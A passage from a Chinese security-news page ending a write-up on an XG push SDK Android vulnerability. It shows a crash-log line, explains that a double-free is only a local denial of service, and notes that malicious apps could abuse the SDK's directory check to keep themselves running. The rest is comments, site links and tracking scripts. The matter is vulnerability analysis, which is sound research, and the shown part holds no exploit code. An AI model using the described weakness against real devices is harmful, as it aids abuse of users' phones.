I/DEBUG&nbsp;&nbsp;&nbsp;(&nbsp;&nbsp;242):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#06&nbsp;&nbsp;pc&nbsp;000014fc&nbsp;&nbsp;/data/app-lib/com.qufenqi.android.quwallet-2/libxguardian.so</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">当然，这个double free漏洞无法利用，因为堆中的内容只能为手机上安装的packagename，所以尽管克服重重困难破解了加密算法、安装了512个packagename，仍然只是一个local DoS。TSRC在最先评级认为是代码执行，后面也更正为了local DoS。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 16px;">最后，总结下漏洞的成因，XG SDK以检查/data/data/&lt;packagename&gt;/lib的存在，来判断是否为使用XG sdk的app，这种方式不够严谨。依然有可能被恶意app利用来保活（ 因为XG sdk后续要启动app的服务），占用系统资源或者妨碍正常使用推送服务的app。</span></p><p><br style="text-align: left;"/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文转载自 drops.wiki-小荷才露尖尖角<br/><a class="text-more" href="http://drops.wiki/index.php/2016/12/08/xgsdk/" target="_blank">原文链接：http://drops.wiki/index.php/2016/12/08/xgsdk/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】一个目录穿越引发的注入及后续——XG SDK漏洞 回顾与思考 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3286" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/12x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6996" user-name="_等一分钟" href="javascript:;">
                _等一分钟            </a>
                        <span class="comment-time">2016-12-13 15:14:44</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6996">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6996" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">转发微博</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/0x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="6995" user-name="均分要上82的grt1st" href="javascript:;">
                均分要上82的grt1st            </a>
                        <span class="comment-time">2016-12-13 13:22:08</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="6995">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_6995" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">@保存到为知笔记</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3286" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
